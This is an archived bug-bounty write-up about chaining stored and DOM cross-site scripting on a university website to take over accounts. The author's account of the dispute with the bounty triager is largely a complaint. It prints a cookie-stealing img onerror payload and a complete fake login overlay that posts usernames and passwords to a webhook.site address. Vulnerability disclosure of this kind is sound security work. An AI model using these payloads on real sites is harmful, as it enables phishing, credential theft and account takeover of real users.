# xss stored bypass cookie http only via all accounts take over ef7134f139d1

- **Source URL:** https://medium.com/@VulnRAM/xss-stored-bypass-cookie-http-only-via-all-accounts-take-over-ef7134f139d1?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905084451/https://medium.com/@VulnRAM/xss-stored-bypass-cookie-http-only-via-all-accounts-take-over-ef7134f139d1
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10914 (id 10914)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
### XSS Stored Bypass cookie http only via all accounts take over

**Hello everyone,**This vulnerability was discovered in Australian University while We tested a

**Stored XSS vulnerability via Account Takeover**, and it was successful. However, when we reported the issue, they said they required a video proof from two different browsers. Then they patched the vulnerability by making the cookie

**HTTP Only**, so it wouldn’t have any obvious impact and they could reject it.

But we didn’t give up 😂 — we figured out a way to demonstrate even greater damage 😈.

With the collaboration of my team, we discovered and extracted this vulnerability.

**MY Team The team consists of 3 members**

Ramzey elsayed nickname is () 

Mahmoud ahmed nickname is ()

Ziad Ahmed nickname is ()

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**##About Me##**

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

My Name is **Ramzey Elsayed** I am a cybersecurity professional specializing in penetration testing, bug hunting, and vulnerability research. I have extensive experience in identifying and reporting security flaws to enhance the safety of digital platforms. ِAnd my nickname is @VulnRAM

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**##About a XSS Stored Vulnerability##**

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**A stored XSS vulnerability** was identified in the application that allows attacker‑controlled JavaScript to be permanently saved and executed in other users’ browsers when they view affected pages. This enables account takeover scenarios, data theft, or unauthorized actions under the victim’s session.

**Focus carefully on controlled JavaScript to be permanently saved and executed in other users’ browsers when they view affected pages.**

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**## Impact (P1**)**##**

An attacker can create a fully functional **fake page** directly inside the university’s own server, leveraging both the **main domain** and the **legitimate login page**.

By exploiting a **DOM XSS vulnerability**, the attacker is able to inject and render complete HTML content. Combined with a **Stored XSS attack**, the injected page can also capture, send, and store sensitive user data.

This type of attack is extremely dangerous because it uses the university’s **official domain**, making the malicious page appear fully legitimate. As a result, even the university’s own security team may fail to detect the manipulation.

If exploited, this vulnerability could lead to:

- Large-scale **account takeover** of student, staff, and faculty accounts.
- Severe **reputational damage** to the university, as the attack would appear to originate from its trusted domain.
- A compromised **security perimeter**, undermining trust in the institution’s digital infrastructure.

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

## ##How I Found the Vulnerability##

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

While exploring the Australian University’s website, we came across a feature that allowed us to upload an Excel sheet. This turned out to be more serious than it first looked — in fact, we managed to turn it into an RCE on users. I’ll be covering that in a separate write-up.

For now, this write-up is all about the **Account Takeover** vulnerability we found. The attack is not just a single step — it’s built on a proper attack chain, so I’d suggest paying close attention to the details.

During our assessment of the Australian University’s platform, we identified a **Stored XSS vulnerability** within a field linked to the scientific research index. This index is responsible for displaying the results of scientific research. 

It executes the injected JavaScript code — and not only that, it also stores it on the server as well as in the DOM.

## ## sooooooooooo

the first idea was to inject a script that extracts the user’s cookie and exfiltrates it. By using that cookie to log in, the attacker could take over the victim’s account.

**By injecting the following code.**

`<img src="x" onerror="new Image().src='https://webhook.site/UR ID?cookie='+document.cookie;">`
Which in turn will extract the cookies and send them to an external attacker-controlled server, allowing the attacker to use them for logging in.

But as we mentioned at the beginning, they said they wanted a proof of concept from **two different browsers**, not just one. Then they modified the cookie to make it **HTTP Only**, just to block us from getting the bounty 😂.

Things didn’t go as we had planned 😂🤔.

Should we give up?

Of course not! 💪🔥

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

## #Sooooooo

We outlined the potential attack plans and attack surface, which were as follows:

Since we found a **Stored XSS** that saves JavaScript code and also executes it and not only that, it keeps executing it — and we also found a **DOM XSS** through which we can inject HTML code, which is also stored using the Stored XSS.

So how can we exploit all of this What a drag! 😅

## I found it!

First, I will inject the object into the **DOM XSS** using injected **HTML code**, which will be crafted to look exactly like the login page. This will serve as the perfect bait, since it uses the university’s main domain and server, making it difficult even for the institution’s own security team to detect that it’s a trap.

Alongside the injected HTML, I will also inject **JavaScript code** that sends the username and password to an external attacker-controlled server. The user will then continue browsing the legitimate site as normal, leaving no room for suspicion that anything unusual has happened.

How? By linking the **Stored XSS object** with the **DOM XSS**, which causes the injection to execute together — and, at the same time, be saved and persisted thanks to the Stored XSS.

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

POC

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

i used this code to create a fake login page with The University logo and to get the credentials on the webhook and then redirect the victim to the main page

`<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#f1f3f5;z-index:9999;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;display:flex;justify-content:center;align-items:center;"> <div style="background:white;padding:40px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);width:320px;"> <div style="text-align:center;margin-bottom:20px;"> <img src="https://URL LOGO" alt="" style="width:200px;"> </div> <h3 style="margin-bottom:20px;font-size:18px;color:#003366;text-align:center;">Sign in to your account</h3> <form onsubmit="event.preventDefault(); (async (form) => { fetch('https://webhook.site/3a99f3f4-501a-4a0b-813a-6332119e1674', { method: 'POST', body: new URLSearchParams({ user: form.email.value, pass: form.pass.value }) }); window.location='https://URL REDIRECT USRE; })(this);"> <input type="email" name="email" placeholder="you@" required style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;"><br> <input type="password" name="pass" placeholder="Password" required style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;"><br> <button type="submit" style="width:100%;padding:10px;background-color:#003366;color:white;border:none;border-radius:4px;">Sign in</button> </form> </div> </div>`
After injecting this code, the HTML will be executed through both the **DOM XSS** and the **Stored XSS**, creating a fake login page controlled by the attacker but hosted on the university’s main domain and server. This means it cannot be identified as fake, even by the institution’s own security team, ultimately resulting in a complete takeover of user accounts.

And in the end, what was the triager’s response? 🤔

1-The first time, they rejected it on the grounds that it had to be demonstrated from two different browsers, and then they fixed the vulnerability by making the cookie **HTTP ONLY** And they asked us to submit it as a **Stored XSS**.

2-We submitted it as a **Stored XSS**, but they rejected it because they considered the vulnerability **out of scope**.

The triager thought that by doing this, he had defeated us and that we would give up :

3-We submitted it as it was in the write-up, just as mentioned above.

The triager’s response was that they had excluded this subdomain from scope and asked us to report the vulnerability through the **VDP**.

We’ve been defeated… I give up
